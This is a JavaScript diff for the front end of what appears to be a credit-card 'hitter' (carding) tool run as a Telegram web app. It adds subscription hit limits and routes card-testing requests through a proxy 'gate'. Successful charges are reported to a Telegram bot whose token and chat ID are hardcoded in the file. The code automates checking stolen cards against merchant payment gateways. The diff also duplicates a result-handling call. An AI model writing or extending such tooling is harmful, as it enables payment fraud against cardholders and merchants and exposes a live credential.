@@ -19,8 +19,12 @@ const API_URL = 'https://hitter1month.replit.app';
 const NOTIFY_BOT_TOKEN = '8680374467:AAEcO6m-O6BOQD0mec7cyURfqQ8Ax2bphkk';
 const NOTIFY_CHAT_ID = '-1003721268860';
 
+let userPlan = 'free';
+let remainingHits = 0;
+let maxHits = 2;
+
 // Authentication Check
-function checkAuth() {
+async function checkAuth() {
     // Auto-fill Chat ID from Telegram WebApp if available
     if (tg?.initDataUnsafe?.user?.id) {
         const loginChatIdInput = document.getElementById('loginChatId');
@@ -30,11 +34,48 @@ function checkAuth() {
     }
 
     if (localStorage.getItem('isLoggedIn') === 'true') {
-        document.getElementById('loginOverlay').classList.add('hidden');
-        document.getElementById('app').classList.remove('blur');
+        const chatId = localStorage.getItem('userChatId');
+        currentChatId = chatId;
+        
+        try {
+            // Sync User Info from Server
+            const res = await fetch('/get-user-info', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chatId })
+            });
+            const data = await res.json();
+            userPlan = data.plan;
+            remainingHits = data.plan === 'free' ? (data.maxHits - data.hitsToday) : 'Unlimited';
+            maxHits = data.maxHits;
+
+            document.getElementById('loginOverlay').classList.add('hidden');
+            document.getElementById('app').classList.remove('blur');
+            updateUIWithPlan();
+        } catch (e) {
+            console.error('Auth sync failed', e);
+        }
     }
 }
 window.onload = checkAuth;
+
+function updateUIWithPlan() {
+    const statusText = document.getElementById('planStatusText');
+    if (statusText) {
+        statusText.innerText = `Plan: ${userPlan.toUpperCase()} | Hits Left: ${remainingHits}`;
+    }
+    // Update hit button if limit reached
+    if (userPlan === 'free' && remainingHits <= 0) {
+        document.getElementById('hitBtnText').innerText = 'Limit Reached - Upgrade';
+    }
+}
+
+// Logout Logic
+function logout() {
+    localStorage.removeItem('isLoggedIn');
+    localStorage.removeItem('userChatId');
+    location.reload();
+}
 
 // Send OTP
 document.getElementById('sendOtpBtn').addEventListener('click', async () => {
@@ -309,42 +350,51 @@ hitBtn.addEventListener('click', async () => {
         // Break loop if STOP was clicked
         if (!isHitting) break;
 
+        // Check Limit Again (Real-time)
+        if (userPlan === 'free' && remainingHits <= 0) {
+            alert('Daily limit reached! Please upgrade your plan.');
+            window.location.href = 'plans.html';
+            break;
+        }
+
         const card = cards[i];
         const startTime = Date.now();
         
         try {
-            const response = await fetch(`${API_URL}/hit/${activeGate}`, {
+            // PROXY HIT through our server
+            const response = await fetch(`/hit-proxy/${activeGate}`, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json',
-                    'X-API-Key': API_KEY
+                    'Content-Type': 'application/json'
                 },
                 body: JSON.stringify({
+                    chatId: currentChatId,
                     url: url,
                     card: card
                 })
             });
 
             const elapsed = ((Date.now() - startTime) / 1000).toFixed(2);
+            const result = await response.json();
 
             if (!response.ok) {
-                let errorDetails = `Status: ${response.status}`;
-                try {
-                    const errorText = await response.text();
-                    try {
-                        const errorJson = JSON.parse(errorText);
-                        errorDetails = errorJson.message || errorJson.error || errorDetails;
-                    } catch (e) {
-                        errorDetails = errorText.substring(0, 60) || errorDetails;
-                    }
-                } catch (e) {
-                    // Fallback if text parsing fails
+                if (response.status === 403) {
+                    alert(result.message || 'Limit Reached');
+                    window.location.href = 'plans.html';
+                    isHitting = false;
+                    break;
                 }
-                injectLog(card, 'error', errorDetails, elapsed);
+                injectLog(card, 'error', result.message || 'System Error', elapsed);
                 continue;
             }
 
-            const result = await response.json();
+            // Update local hit count
+            if (userPlan === 'free') {
+                remainingHits = result.remainingHits;
+                updateUIWithPlan();
+            }
+
+            processHitResult(card, result, elapsed, i + 1, cards.length);
             processHitResult(card, result, elapsed, i + 1, cards.length);
 
             // STOP IMMEDIATELY if hit is successful
@@ -443,7 +493,7 @@ async function sendHitToTelegram(card, res) {
 
     const message = `
 🔥 <b>HIT DETECTED</b> ⚡
-👤 ${userName} [Gold]
+👤 ${userName} [${userPlan.toUpperCase()}]
 ↔️ <b>Gateway</b>: ${gateway}
 ✅ <b>Response</b>: Charged Successfully
 🌐 <b>Site</b>: ${res.site || analyzedData.site || 'Unknown'}
